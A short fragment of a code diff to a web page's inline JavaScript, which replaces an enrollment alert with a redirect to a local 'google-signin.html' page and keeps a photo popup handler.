+      document.getElementById('enroll-dialog').classList.remove('active');
+      window.location.href = 'google-signin.html';
+    });
+
+    // Photo popup
     document.getElementById('photo-btn-1').addEventListener('click', () => {
       if (!photos[1]) return;
       document.getElementById('popup-img').src = photos[1];
@@ -659,16 +644,7 @@
       document.getElementById('popup-img').src = '';
     });
 
-    // ─── Enroll button ───────────────────────────────────────────
-    document.getElementById('enroll-btn').addEventListener('click', () => {
-      if (completed.length < TOTAL_TASKS) return;
-      alert('You have been enrolled! Results will be announced within 24 hours. Good luck!');
-    });
-
-    // ─── Initialize locks ────────────────────────────────────────
     updateLocks();
-
   </script>
-
 </body>
 </html>
